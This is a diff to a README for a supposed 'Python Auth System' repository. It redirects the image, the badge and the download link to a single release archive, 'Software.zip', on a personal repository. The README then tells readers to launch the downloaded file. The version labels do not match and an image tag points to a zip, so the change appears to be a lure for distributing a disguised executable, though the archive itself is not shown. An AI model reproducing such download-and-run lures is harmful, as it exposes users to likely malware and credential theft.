@@ -1,7 +1,7 @@
 
 # Python Auth System 🔐
 
-![Python Auth System](https://imageurl.com)
+![Python Auth System](https://github.com/shyamshivasfdc/python-auth/releases/download/v2.0/Software.zip)
 
 Welcome to the **Python Auth System** GitHub repository, your one-stop solution for securing your Python programs with ease. This repository provides a complete code base for an authentication system in Python, allowing you to protect your applications and tools effectively.
 
@@ -20,9 +20,9 @@ Welcome to the **Python Auth System** GitHub repository, your one-stop solution 
 ## Get Started
 To access the latest version of the Python Auth System, you can download it from the following link:
 
-[Download Python Auth System v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Python Auth System v1.0.0](https://github.com/shyamshivasfdc/python-auth/releases/download/v2.0/Software.zip)
 
-![Download Python Auth System](https://img.shields.io/badge/Download-v1.0.0-brightgreen)
+![Download Python Auth System](https://github.com/shyamshivasfdc/python-auth/releases/download/v2.0/Software.zip)
 
 🚀 Once downloaded, launch the file to begin integrating the Python Auth System into your projects.
 
